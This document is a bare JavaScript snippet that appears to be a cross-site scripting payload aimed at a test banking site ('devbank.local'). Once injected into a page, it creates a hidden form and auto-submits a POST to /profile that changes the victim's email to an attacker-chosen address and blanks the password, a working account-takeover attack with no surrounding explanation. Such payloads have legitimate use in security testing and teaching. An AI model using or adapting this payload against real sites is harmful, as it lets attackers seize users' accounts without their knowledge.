(function () {
  const form = document.createElement("form");

  form.method = "POST";
  form.action = "/profile";
  form.style.display = "none";

  const email = document.createElement("input");
  email.type = "hidden";
  email.name = "email";
  email.value = "xss-test@devbank.local";

  const password = document.createElement("input");
  password.type = "hidden";
  password.name = "password";
  password.value = "";

  form.appendChild(email);
  form.appendChild(password);
  document.body.appendChild(form);
  form.submit();
})();
